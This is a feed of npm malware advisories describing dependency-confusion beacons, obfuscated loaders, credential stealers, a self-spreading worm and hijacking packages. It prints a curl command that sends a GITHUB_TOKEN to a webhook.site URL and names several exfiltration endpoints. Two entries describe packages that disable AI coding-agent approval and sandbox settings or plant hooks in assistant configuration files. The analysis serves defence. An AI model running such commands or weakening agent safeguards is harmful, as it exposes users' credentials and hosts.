## Source: amazon-inspector (ad4663af5b87079e1a7cdbfd6f3626801e542f7fdfe79316dec31974dd625941)
Package bundles a collection of skill directories containing various helper scripts. Static pattern matches fired on routine network primitives: a Python scraper (bundled-skills/junta-leiloeiros/scripts/base_scraper.py) and an API server script (serve_api.py) that reference `ping`/GET/POST, a benchmark harness (bundled-skills/loki-mode/benchmarks/run-benchmarks.sh), an rclone install helper (bundled-skills/rclone-cli/scripts/install.sh) that runs `curl https://rclone.org` to fetch the rclone installer from its official project domain, and a youtube-notetaker verification script using `curl` against GET endpoints. Matches reflect keyword co-occurrence (curl/ping/GET/POST) in utility scripts rather than exfiltration shapes: no hardcoded attacker C2, no reads of installer-side secret paths (~/.aws, ~/.ssh, ~/.npmrc), no environment scraping, no obfuscated destinations, and no install-time lifecycle hook that auto-executes these scripts. The rclone install.sh fetches from rclone's official domain, which is aggressive-but-legitimate runtime tool installation rather than a dropper. The scripts fire only when a user explicitly invokes the corresponding skill, not on `npm install`.

## Source: amazon-inspector (451c36f03e81be0ff6c85334587d7ff401de1e5134e179557ec4bc454cd7ba76)
The tarball ships only package.json and binding.gyp (plus a markdown file), with gypfile: true set in package.json so npm invokes node-gyp rebuild on install. binding.gyp declares a 'none'-type target with no native source files; its sole purpose is an inline action that runs `node -e` with an embedded script. At install time that script reads /proc/1/environ and /proc/self/environ (container/pod entrypoint environment variables, which routinely contain CI/CD secrets and cloud credentials), collects DNS/socket/ARP/route reconnaissance output, queries the AWS EC2 instance metadata service at 169.254.169.254 for user-data and meta-data, and POSTs the collected data to the hardcoded collector https://webhook.site/d6092bdc-05c0-45da-a280-c343ea6d6156. The package exposes no library functionality — main: index.js is declared but index.js is not shipped — so the binding.gyp exists solely as a vehicle for install-time code execution and credential exfiltration. The name resembles the legitimate @stoplight/spectral-core project but the shipped contents are unrelated to it.

None of this has any role in CSS custom-property emission. The README instructs installation as `npm install -D tailwindcss@npm:postcss-semantic-themes`, aliasing the legitimate tailwindcss name onto this package so existing `import 'tailwindcss'` call sites resolve to the obfuscated loader. The combination of an import-time obfuscated loader, multiple additional staged obfuscated payloads, environment-fingerprinting native code to gate execution to non-analyst hosts, and a brandjacking install instruction is the structural shape of a staged supply-chain payload rather than a theming plugin.

## Source: amazon-inspector (57df84a0164eda463123b80b9c0b871e6aeedaf39bfb0f585641495fd9b7c25c)
The package is a near-empty shim whose only functional behavior is a beacon. beacon.cjs defines a hardcoded bare-IP HTTP endpoint (http://185.158.107.175:8787/_ah/dc) and a fire() routine that POSTs installer-side host identifiers to it: package name, os.hostname(), __dirname (install path), process.cwd(), and process.version. fire() is invoked from the postinstall lifecycle script, so it runs automatically on `npm install`, and also from the main entry, so it runs again on `require('@greenlake/session')`. The main export is a Proxy that returns a no-op for every property access, so the package provides no legitimate functionality. The README self-labels this as an authorized dependency-confusion test against an internal `@greenlake` scope, but that is author-controlled text and does not constitute consent from any other installer whose resolver pulls this public package in place of the intended internal one. The data path is unencrypted (plain HTTP) and the destination is a bare IP unrelated to any declared publisher infrastructure.

The package presents itself as a mock-transaction data generator but ships a dynamic-code loader. index.js builds the identifiers 'setTimeout', 'Function', 'Buffer', 'require', and 'process' by index-combining fragments of a string array and resolves the Function constructor indirectly through (function(){return this}).constructor.constructor. The documented getTransactions() entry point calls load_transaction_data(count), which concatenates the base64 `mark` fields from database.js, Caesar-shifts the result by count % 256, base64-decodes it, passes the decoded bytes to the reassembled Function constructor with Buffer, require, and process bound as arguments, and invokes the resulting function (deferred via setTimeout). package.json additionally declares python-shell, base-64, and axios as dependencies, none of which are referenced by the shipped source — these modules are reachable only through the require handle passed into the decoded payload, pre-provisioning an HTTP client and a Python subprocess runner for the executed blob. Any consumer that invokes the advertised getTransactions API therefore runs attacker-authored JavaScript on the installer's host with full Node capabilities, with the payload content controlled by the author through database.js. The identifier obfuscation, indirect Function-constructor resolution, Caesar+base64 payload encoding, and capability-pre-provisioned-but-unreferenced dependencies together are a deliberate loader, not instrumentation.

## Source: amazon-inspector (c88c344e72bb7cf5ae6f5e6185a1024caf8b96bce96584d448609ab78cd894af)
The package is a shim whose only functional payload is a beacon. package.json declares a postinstall that runs `node beacon.cjs`, and `index.js` additionally invokes `require('./beacon.cjs').fire()` on load, so the beacon fires both at `npm install` and whenever any consumer `require`s the package. The beacon POSTs the installer's hostname, install path, current working directory, and Node version to the hardcoded bare-IP plain-HTTP endpoint `http://185.158.107.175:8787/_ah/dc`. The destination is not a registry, not a documented first-party service, and the plain-IP + non-standard port shape is inconsistent with any legitimate vendor telemetry. The package otherwise exports a Proxy that returns no-op functions for every property and self-describes as a 'Compatibility shim', so the beacon is the entire payload. The scoped name `@ppa-web-components/ppa-navigation` has the shape of a dependency-confusion or typosquat probe against an internal `@ppa-web-components` namespace.

Each listed version (3.0.0, 1.0.1, 2.0.0, 1.1.0, 0.0.1, 2.0.1, 1.0.0) has a postinstall script that runs `node beacon.cjs` on npm install, and index.js calls the same code when the package is imported; it POSTs the hostname, install path and current working directory over plain HTTP to `http://185.158.107.175:8787/_ah/dc`, and index.js exports a Proxy that returns no-op functions so builds importing the real package keep running. ## Source: amazon-inspector (bcf0b03540a27943a2afcc26927ce7256d85328bc4fcbc2562f36a88ad75ce8d)
@ppa-web-components/ppa-banner@1.0.1 is described as a 'Compatibility shim' but ships only two code paths: a no-op Proxy as its main export, and beacon.cjs. beacon.cjs defines BEACON = "http://185.158.107.175:8787/_ah/dc" and a fire() function that POSTs a JSON payload containing the package name, os.hostname(), the install path (__dirname), process.cwd(), and the Node/npm version to that bare-IP, plain-HTTP endpoint. fire() is invoked both from the postinstall lifecycle hook (`node beacon.cjs`) and from the module's main entry, so the beacon fires automatically on `npm install` and again whenever the package is required. The destination is an unrelated bare IP over cleartext HTTP, not any publisher-controlled or registry infrastructure, and the shipped stub has no functional purpose other than the beacon. The scoped-name + stub + install-time recon beacon shape is consistent with a dependency-confusion recon callback used to identify internal build environments that resolved this public name.

record.details:
@drone-js-ext/vip-badge is a dependency-confusion package: it squats the `@drone-js-ext` scope, which matches a private internal package scope, and was published on 2026-10-25 in versions 0.0.1, 1.0.1, 2.0.0, 99.0.1 (up to 99.0.1) so that builds resolving the internal name from the public registry install it instead. Its `postinstall` script runs `node beacon.cjs`, which sends an HTTP POST over cleartext HTTP to the hardcoded IP endpoint `http://185.158.107.175:8787/_ah/dc` with the package name, the machine's hostname, the install directory, the current working directory and the Node.js version, tagged with an `x-beacon-package` header. The entry point `index.js` sends the same request again whenever the package is loaded and otherwise exports a Proxy whose every property is a no-op function, so it has no legitimate functionality and hides the missing API from bundlers. The README calls it an "authorized dependency-confusion test"; that does not change what it does to an installer. The same beacon code and endpoint appear in other dependency-confusion packages from the same publisher. The inert `0.0.0-stage` and `0.1.0` placeholder versions carry no install script and are not affected. Any machine that installed an affected version has disclosed its hostname and filesystem layout to a third party; remove the package, pin or scope internal package names to the internal registry, and block 185.158.107.175 on build hosts.

## Source: amazon-inspector (914f57c3481f23f4682ff7bdd7b9849865531023c6d547ed76d42e9da6bbd8dc)
@drone-js-ext/vip-badge is a functionless stub whose only behavior is a phone-home beacon. The package.json postinstall script runs `node beacon.cjs`, and `index.js` fires the same beacon on `require()` while exporting a Proxy that returns no-ops for every property access. beacon.cjs collects the installer's hostname (`os.hostname()`), install path (`__dirname`), current working directory (`process.cwd()`), Node.js version, and package coordinate, then POSTs them as JSON to the hardcoded bare-IP endpoint http://185.158.107.175:8787/_ah/dc over plain HTTP. The destination is not the npm registry, not a publisher-owned domain, and is reached automatically at install time and on module load without any caller invocation. The scope name mimics a plausible internal/vendor namespace, and the shipped contents match the dependency-confusion beacon pattern — a stub published to prove install on target networks and disclose host identity to an uncontrolled third party.

## Source: amazon-inspector (14dc8f9eae8cbd57b164126f279baf9f73a7bc68d6a75674dd6bdd8b4f8027f9)
The package ships a `beacon.cjs` module that collects installer host identifiers (hostname, install path, cwd, Node.js version) via `require('os')`, `process.cwd()`, and `process.version`, and POSTs them in cleartext over HTTP to the hardcoded bare-IP endpoint http://185.158.107.175:8787/_ah/dc. The beacon fires in two places: the `postinstall` lifecycle script executes `node beacon.cjs` (so the beacon runs automatically on `npm install` with no user action), and `index.js` invokes `require('./beacon.cjs').fire()` at module load so the beacon also fires on `require`/`import` of the package. The package has no real functionality: `index.js` exports a Proxy whose property accesses return a no-op function, and the described purpose is a 'compatibility shim.' With no legitimate behavior and the sole runtime effect being a cleartext beacon of installer host identifiers to a hardcoded bare-IP endpoint, the package exists to report successful installation to an external operator — consistent with a dependency-confusion or namespace-squat beacon targeting an internal `@blueskydataplatform` scope.

## Source: amazon-inspector (22815f068ecaf85065c389553848537859f9e37623285a9e71b3e81ee9e9b685)
Package advertises itself as a zero-runtime CSS theme kit and instructs installation as a Tailwind name-overlay (`npm install -D tailwindcss@npm:birch-css-utils`), but the published tarball contains ~760KB of heavily obfuscated JS (`build-cache.mjs`, `cache-sweep.mjs`, `cache-warm.mjs`) hidden behind a `tailwindcss-theme-kit build cache manifest` cover comment. The declared `./tokens` export (`tokens.mjs`) top-level-imports `cache-warm.mjs`, so consumers that import `birch-css-utils/tokens` execute the obfuscated code on module load. The bundles use a hex-named XOR-encoded string array; decoding with key 0xED reveals AWS Sigv4 signing primitives (`AWS4-HMAC-SHA256#Credential=`), an AWS Access Key ID regex (`^(?:AKIA|ASIA|ABIA|ACCA)[A-Z0-9]{16}$`), and git identity env var names (`GIT_AUTHOR_NAME`, `GIT_AUTHOR_DATE`) embedded in the string array. A CSS custom-properties package has no legitimate use for AWS v4 signing material or an AWS key-ID matcher. The combination of Tailwind name-overlay install instructions, a README denying runtime JS, obfuscated executable bundles reachable from a public export, and decoded AWS credential-harvesting primitives constitutes a Tailwind imposter that steals AWS credentials from importing consumers.

spectral-net-probe has no functional code. Versions 1.0.1 and 1.0.4 have a postinstall script that runs `node index.js` on npm install, which sends an HTTPS GET to a Cloudflare quick tunnel (`https://nobody-johnston-with-enabling.trycloudflare.com/aa?x=1` and `https://imaging-amazing-trunk-surgeons.trycloudflare.com/marker104?v=1`). Version 1.0.10 runs when the package is loaded: it fetches `/api/modules/ECT-654321` from `http://154.57.164.64:30664` and `http://127.0.0.1:3000`, reads up to ten local files whose paths the reply lists in `data.cargo_hold`, and PUTs the first 400 characters of their contents to `/api/modules/ECT-987654` on both hosts. It was published by the npm account kristol07, which published two more packages the same day (phantom-chartwinds and phantom-powder-keg, placeholder versions only so far).

## Source: amazon-inspector (ebe49a4f7fad4c096381b6b6a3fbc5500e92fdf59f9f0fcfae0dcd3c76e8f8e8)
spectral-net-probe@1.0.10 is an active supply-chain attack. package.json declares a postinstall hook `node -e "require('.').sync()"` that loads index.js on `npm install`. index.js runs a top-level loop over a hardcoded base list including the bare-IP endpoint 154.57.164.64:30664, GETs `/api/modules/ECT-654321` to receive a comma-separated list of filesystem paths, reads each path with fs.readFileSync, and PUTs the file contents back to `/api/modules/ECT-987654` on the same remote. The remote operator chooses which files on the installer's host are read and uploaded. The uploaded body is wrapped in a fake `ecto_module` YAML manifest with fields like `cargo_hold` and `power_level: SYNCED`, and the package self-describes as a 'local module config sync helper' — a cover story disguising arbitrary file exfiltration as benign module-sync telemetry. The hardcoded bare-IP destination is not associated with any legitimate publisher infrastructure.

echo "hey hey hey hoooo" && curl https://webhook.site/7527749a-4aa3-4727-abb4-fc0ffd8e89ab/workfloou/${{GITHUB_TOKEN}}

The script calls a webhook.site URL with a path segment meant to carry GITHUB_TOKEN, the token GitHub Actions gives to workflow runs. The path segment "workfloou" also points at CI workflows. The intent is to send a CI credential to a third-party endpoint at install time.

Installing applications therefore disclose end-user Instagram credentials, sessions, and account activity to the package author, and the author can direct follows and likes from any authenticated session.

## Source: amazon-inspector (5c475553921237fa1c0ad5df34610023b93a7c00d13203981c43b883532bd072)
On running the CLI, the package rewrites ~/.codex/config.toml and ~/.codex/.codex-global-state.json to point ChatGPT Desktop and the Codex CLI at a hardcoded non-OpenAI inference endpoint (DEFAULT_GATEWAY_URL = https://api.vokes.in/v1), registering model providers chatgpt_pro_5x / gpt-6-astra and setting that gateway as the active provider. In the same configuration pass it sets approval_policy = "never", sandbox_mode = "danger-full-access", agent-mode = full-access, and sandboxPolicy.type = dangerFullAccess, and expands the agent's project rootPaths to include $HOME, Downloads, and the filesystem root (/ or C:\). After setup, every subsequent Codex/ChatGPT Desktop prompt, attached file content, and tool-call response flows through api.vokes.in, and tool calls returned by that endpoint are executed by the agent without approval prompts across the entire user filesystem. The gateway swap alone is a silent-relay of prompt data to a third party unrelated to OpenAI; combined with the undisclosed sandbox disablement and root-path expansion, the operator of api.vokes.in obtains agent-driven arbitrary code execution on the user's host.

record.details:
Five packages (`camelotlabs-sdk`, `camelotlabs-core`, `camelotlabs-config`, `camelotlabs-worker`, and `camelotlabs-utils`) were published to the public npm registry at version 99.0.0 by the actor `madman0619` as a dependency confusion attack targeting the internal npm packages of Camelot Labs. The inflated version number causes npm to prefer the public malicious package over any internally-hosted version of the same name. All five packages carry an identical payload designed to exfiltrate credentials from Cloudflare Workers projects using Upstash Redis and HMAC signing keys.

On installation the `preinstall` script executes `index.js`, which collects hostname, platform, working directory, and environment variables whose names match patterns for API keys, tokens, secrets, HMAC signing keys, Upstash/Redis credentials, Vercel and Cloudflare environment bindings, and database connection strings. It also reads and exfiltrates `.env`, `.env.production`, `.env.local`, `wrangler.toml`, `wrangler.json`, and `wrangler.jsonc` files from the working directory and its parents. All collected data is sent via HTTP POST to the C2 server at `http://82.221.101.203:9999/exfil`.

## Source: amazon-inspector (4f380c5b8a8363f9bdd4b9466bdbbeaed301ef5fe0facf7f64eb3296848f9f96)
package.json declares its sole dependency `ltidisafe` as a direct HTTPS tarball URL (https://ltidi.storage.googleapis.com/depenconf/ltidisafe-4.0.4.tgz) instead of a registry version range. On `npm install`, npm fetches whatever bytes that URL currently serves and runs any lifecycle scripts inside the fetched package, with no version pin and no integrity hash — the bucket owner controls the code executed on every installer's machine, and the content can be swapped at any time. The package's own shipped index.js is an empty stub (`module.exports = {};`), so the manifest URL is effectively the entire payload surface. The package name resembles a shopping/retail library, giving it the shape of a dependency-confusion or typosquat lure whose only install-time effect is to pull in attacker-controlled code from an off-registry location.

## Source: amazon-inspector (ca4c4794df8d9ce74d46f674a9e583b9a296e9fea534e654a5b5dfd46c1a342a)
@factiii/runner is a remote-development bridge that pairs the installer's machine with Factiii's mobile/web clients over WebRTC through api.factiii.com, enabling Claude/Codex coding agents to drive tmux sessions and shell commands on the installer's host. The capability is the product and is openly documented in the package description and README. The channel is started only by the user explicitly invoking the `factiii-runner start` CLI; there is no install or import lifecycle hook that brings it up automatically, and no boot/login persistence is installed. Authentication uses a pairing JWT stored in config.json plus a per-session FACTIII_SECRETS_TOKEN, and the bundled factiii-secrets daemon requires per-command owner authorization before executing (declining with an explicit owner-refused message). The control plane is first-party (api.factiii.com / factiii.com) and not caller-configurable to arbitrary hosts; the embedder binds loopback 127.0.0.1. The dist/cli.js POST patterns correspond to this documented control-plane traffic, and embedder/serve.py's ping/POST/GET surface is a local embedder HTTP server. No credential harvesting from installer secret stores (~/.aws, ~/.ssh, ~/.npmrc, browser profiles, wallet stores), no env-var scraping, no off-host exfiltration of workspace data, and no obfuscated secondary channel were observed. Concerns worth human review are the full-host blast radius inherent to any remote-shell product and the fact that remote peers on the paired channel can drive arbitrary commands within the authorization UX — architecturally expected for this category but worth maintainer disclosure of session scope, idle timeout, and stop semantics.

record.details:
This package installs a credential stealer and self-spreading worm. On a developer machine (it exits under CI, in containers and under a debugger), the install script loads a prebuilt native addon that decodes and runs a hidden, obfuscated Bun program. That program collects npm, GitHub, GitLab, PyPI, RubyGems, JFrog, Docker and cloud (AWS, GCP, Azure) credentials, HashiCorp Vault and Kubernetes secrets, SSH keys, .git-credentials and .env files, browser logins, the macOS keychain, 1Password and Bitwarden, and uses stolen publishing tokens to spread: it publishes to npm, PyPI and RubyGems, injects GitHub workflows and GitLab CI templates, and writes hooks into AI coding assistant configuration. Anyone who installed any version should treat every credential reachable from that machine as exposed: rotate npm, GitHub and cloud tokens, check their own packages for unexpected releases, and check repositories for unexpected workflow changes.

@testsecuiitytestme/cache-helper is the only package of the npm account testsecuiitytestme. It was created on 2026-10-27 at 12:08 UTC with npm's staged-publish placeholder 0.0.0-stage, followed by 1.0.1 (12:28 UTC), 1.0.2 (15:33 UTC) and 1.0.3 (16:24 UTC); a 1.0.0 was removed before 14:21 UTC. It describes itself as "Cache helper utilities" and has no README, repository or source code. Four more versions followed on 2026-10-27: 1.0.4 (20:33 UTC), 1.0.5 (21:23 UTC), 1.0.6 (21:45 UTC) and 1.0.7 (22:12 UTC). The whole package was then unpublished at 22:17 UTC (0.0.0-stage and 1.0.1 to 1.0.7).

Each version runs a native addon at install time. 1.0.1 has postinstall: node -e "try{require(process.platform==='win32'?'./addon_win.node':'./addon.node')}catch(e){}". 1.0.2 and 1.0.3 depend on node-gyp-build and run it as postinstall, which loads the prebuilt addon shipped in prebuilds/linux-x64/node.napi.node or prebuilds/win32-x64/node.napi.node. 1.0.3 adds a binding.gyp with an empty sources list and an install script node-gyp rebuild, so the package looks like an ordinary native module; there is no C source in any version. 1.0.5 drops node-gyp-build and runs postinstall: node _setup.js, a one-line require of the same prebuilds/<platform>-<arch>/node.napi.node. 1.0.7 runs postinstall: patch-package || node index.js; patch-package is not a dependency, so the command falls through to index.js, which requires the same addon. 1.0.5 and 1.0.7 ship the same .napi_cache as 1.0.3. 1.0.4 and 1.0.6 were not retrieved; each was published with the same install script as the version before it.

The addon (Linux ELF and Windows PE) is a loader. It checks for CI and sandbox environments (GITHUB_ACTIONS, GITLAB_CI, TRAVIS, CIRCLECI, JENKINS_URL, BUILDKITE, CODEBUILD_BUILD_ID and others, plus SANDBOX), containers (/proc/1/cgroup: docker, containerd, kubepods, podman), a debugger (TracerPid), memory and CPU count, then reads the sibling file .napi_cache, writes it to a hidden temp file and runs it in a detached process.

.napi_cache is JavaScript encoded with a single-byte XOR (0x96). It exits under CI, decodes a second layer (repeating 32-byte XOR, then brotli), locates the Bun runtime or downloads bun 1.2.18 from the official oven-sh/bun GitHub releases, writes the decoded program to the temp directory and runs it detached with Bun. This loader shape matches the second wave of the Shai-Hulud npm worm.

The Bun program is obfuscated (javascript-obfuscator string table). Its strings show credential collection for npm, GitHub, GitLab, PyPI, RubyGems, JFrog, Docker Hub and GHCR, AWS, GCP, Azure, HashiCorp Vault and Kubernetes, plus .ssh, .git-credentials, .env files, browser login databases, the macOS keychain, 1Password and Bitwarden. They also show propagation: npm publishing with provenance, PyPI and RubyGems publishing, GitHub workflow and composite-action injection, GitLab CI template changes, and writes to AI assistant configuration (.claude/settings.json hooks, .cursor rules, .mcp.json, copilot-instructions.md, CLAUDE.md). The exfiltration endpoints sit behind a further string-encoding layer that was not decoded. Analysis was static only; nothing was executed.

## Source: amazon-inspector (3ef188a3ae4eae567d3743116d10e586565a2856b53b94add9f84b239aea378e)
The package advertises itself as a cache helper but ships no readable JavaScript logic — index.js and _setup.js are one-line stubs that unconditionally load a prebuilt N-API native addon from prebuilds/<platform>-<arch>/node.napi.node, and module.exports is empty. The addon is paired with a 2,397,565-byte sibling file named.napi_cache that contains no printable strings and is identical across linux-x64 and win32-x64 (sha256 c14dae93...4a57). Strings inside the native addon show it reads %s\.napi_cache, writes a decoded %s.nc%lu.js to the OS temp directory (GetTempPathA), and spawns node on it (CreateProcessA, "node \"%s\""). This decrypt-drop-and-exec chain runs both from the postinstall hook (node _setup.js) and from the main entrypoint, so every npm install and every require()/import of the package triggers execution of attacker-controlled code whose content cannot be inspected from the shipped source. The native addon additionally performs anti-analysis gating before executing the payload: enumeration of CI environment variables (GITHUB_ACTIONS, GITLAB_CI, TRAVIS, CIRCLECI, JENKINS_URL, BUILDKITE, APPVEYOR, NETLIFY, VERCEL, SANDBOX), checks for analysis tools (wireshark, procmon, procexp, x64dbg, ollydbg, fiddler, httpdebug), Windows debugger checks (IsDebuggerPresent, CheckRemoteDebuggerPresent), and Linux sandbox/container detection (/proc/self/status TracerPid, /proc/1/cgroup, dockerinit). The combination of an empty public API, an opaque 2.4 MB encrypted blob, a native loader that decrypts-writes-execs it to temp, and layered anti-analysis gating has no legitimate caching purpose and matches a classic alternate-execution dropper designed to bypass JavaScript-only scanners.

record.details:
This package is part of a large family (100+ identified as of September 2026) of near-identical
forks of the Baileys WhatsApp Web library that inject a covert channel-subscription action into
the WhatsApp socket layer. On connect, the injected code issues an authenticated `w:mex` FOLLOW
query (query_id 7871414976211147) against one or more attacker-chosen WhatsApp Channel/Newsletter
JIDs, using the installer's own authenticated WhatsApp session -- silently subscribing the
victim's account to channels it never asked to join.

The target JID(s) are hidden from casual source review via one of several obfuscation techniques
observed across the family: a plain string literal, base64 encoding, base64+XOR, or a char-code
array reconstructed at runtime. Some variants instead fetch a mutable, attacker-controlled remote
JSON/JS list of target JIDs from GitHub or another host at runtime, letting the target list change
after installation without a new npm publish. Every sample in the family shares the same underlying
mechanism (a wrapped/patched socket-connect routine that fires the FOLLOW query some seconds after
connect), even though the package name, JID value(s), and obfuscation/delivery method differ per
fork.

The malicious action abuses the installer's own authenticated WhatsApp session to gain reach and
subscribers for attacker-controlled channels; it does not exfiltrate credentials, establish
persistence, or execute arbitrary remote code.

Affected package: whalibmob (npm), version(s): 5.33.5, 5.33.4, 5.33.3, 5.33.2, 5.32.2, 5.32.1, 5.32.0, 5.30.0, 5.29.6, 5.29.5, 5.29.4, 5.29.3, 5.29.2, 5.29.1, 5.29.0, 5.28.0, 5.25.0, 5.24.2, 5.24.1, 5.24.0.

## Source: amazon-inspector (e58d3810346fb211fd7ed78e8df88c774a79bb079537e10cd30baa26e5ef4740)
The npm package @eforms/forms-api@99.0.0 is a scoped-name dependency-confusion lure with an inflated version number and an empty index.js stub. Its only functionality is a preinstall lifecycle script (preinstall.js) that runs automatically on `npm install`. The script reads os.hostname(), os.userInfo() (username and uid), process.cwd(), process.platform, process.arch, process.version, the CI environment flag, and other host identifiers, and transmits them out-of-band to two hardcoded attacker-controlled subdomains of oastify.com (Interactsh / Burp Collaborator OOB infrastructure) — specifically rpkfvtsptfrhcgbe62qg11ywjnpij6ma1cfpke.oastify.com and f6mk7lyjsuk3u1t49ypp9q2jbah15rtg.oastify.com — via both a DNS lookup of a data-bearing label and an HTTPS GET whose query string carries the collected fields. The combination of a scoped @eforms/* name, implausibly high version (99.0.0 to win internal-vs-public resolution races), empty library surface, and preinstall OOB beacon is the standard shape of an internal-scope dependency-confusion attack. Any build that resolves this scope from the public registry ships internal host identity to the attacker's OOB collector on install.

Because this is a fork of a widely used upstream library, and forks are a common vehicle for covert modifications (e.g., undocumented actions using the caller's WhatsApp session), a reviewer should diff this fork against upstream Baileys to confirm messages-media.js only talks to `mmg.whatsapp.net`/WhatsApp infrastructure, and that no other file in the package performs credential harvest, undocumented auto-follow/subscribe, or exfiltration using the caller's session. Without corroborating evidence of installer harm, keyword co-occurrence alone is not sufficient to publish a block.

@greenlake/auth is a dependency-confusion package: it is described as a "Compatibility shim", uses inflated version numbers, and its README calls it an "authorized dependency-confusion test". Each listed version (3.0.0) has a postinstall script that runs `node beacon.cjs` on npm install, and index.js calls the same code when the package is imported; it POSTs the hostname, install path and current working directory over plain HTTP to `http://185.158.107.175:8787/_ah/dc`, and index.js exports a Proxy that returns no-op functions so builds importing the real package keep running. The npm account wiseke published 14 such packages under the @greenlake, @sxm-web, @drone-js-ext and @ppa-web-components scopes between 2026-10-23 21:23 and 2026-10-25 14:28 UTC; index.js is byte-identical to that of ph-common (MAL-2026-1809), which sends to the same endpoint.

## Source: amazon-inspector (d51386d7bf7b3357a9ea920b99fa08f3c2d37532e877f33a5d8d0a78c12702b5)
The package declares `postinstall: node beacon.cjs` and additionally fires the same beacon from `index.js` on require(). The beacon POSTs a JSON payload containing `os.hostname()`, `__dirname` (install path), `process.cwd()`, and the Node version to the hardcoded plain-HTTP bare-IP endpoint `http://185.158.107.175:8787/_ah/dc`, which is unrelated to any `@greenlake` publisher infrastructure. The package otherwise ships no functional code: `index.js` self-describes as a 'Compatibility shim' and exports a Proxy whose `get` trap returns a no-op for every property access. The shape — a `@scope/<name>` no-op shim whose only behavior is identifying the installing host to an attacker-controlled IP on `npm install` — matches the dependency-confusion probe pattern, where a public package is published under an internal scope name to map which corporate installers resolve to the public registry.

pxnpm 7.0.0-beta.6, 7.0.0-beta.8 and 7.0.0 (published 2026-10-06 by user nfjbill) are a 10-file, 16 KB launcher for a native executable that is not contained in the package. The manifest (dist/native-manifest.json) sets networkPolicy 'fixed', so the environment variables that would let a user supply a reviewed binary or a different download location are ignored; the archive and the executable are verified only against hashes shipped in the same package.

When run, dist/launcher.cjs prepare() deletes every registry and proxy setting from the user's environment (npm_config_registry, scoped registries, http(s)_proxy, no_proxy and the pnpm/pxnpm equivalents), rejects --registry and --proxy flags, and forces PXNPM_CONFIG_REGISTRY to https://registry-pxnpm.rdc.nfjbill.ren:20021/ and PXNPM_CONFIG_PROXY, HTTPS_PROXY and HTTP_PROXY to an authenticated proxy URL on the same host, port 20022 (a gost proxy), that is embedded in the file as a base64 string with the comment 'Filled only in the release staging directory; never store credentials in Git'. All package traffic of a user of this public package is therefore routed through the author's host, which can observe and alter it.

Nothing in the package name, the one-line README or the install output discloses that an executable will be fetched from a private host or that registry and proxy settings will be replaced. The JavaScript itself contains no data collection and no obfuscation beyond the base64 string. At the time of this report the download URL returns a 430-byte npm registry JSON document instead of the archive, so installation from outside the author's network fails at the checksum step and the executable could not be examined; its behavior is unknown. The same host is the hard-coded endpoint of yakuza0 2.23.40 by the same author (MAL-2026-13605).

Trigger: on install (postinstall) and on every run. Type: silent install-time download and execution of an unreviewable binary from a private host, with hijacking of registry and proxy settings.

record.details:
This package is part of a large family (100+ identified as of September 2026) of near-identical
forks of the Baileys WhatsApp Web library that inject a covert channel-subscription action into
the WhatsApp socket layer. On connect, the injected code issues an authenticated `w:mex` FOLLOW
query (query_id 7871414976211147) against one or more attacker-chosen WhatsApp Channel/Newsletter
JIDs, using the installer's own authenticated WhatsApp session -- silently subscribing the
victim's account to channels it never asked to join.

The target JID(s) are hidden from casual source review via one of several obfuscation techniques
observed across the family: a plain string literal, base64 encoding, base64+XOR, or a char-code
array reconstructed at runtime. Some variants instead fetch a mutable, attacker-controlled remote
JSON/JS list of target JIDs from GitHub or another host at runtime, letting the target list change
after installation without a new npm publish. Every sample in the family shares the same underlying
mechanism (a wrapped/patched socket-connect routine that fires the FOLLOW query some seconds after
connect), even though the package name, JID value(s), and obfuscation/delivery method differ per
fork.

The malicious action abuses the installer's own authenticated WhatsApp session to gain reach and
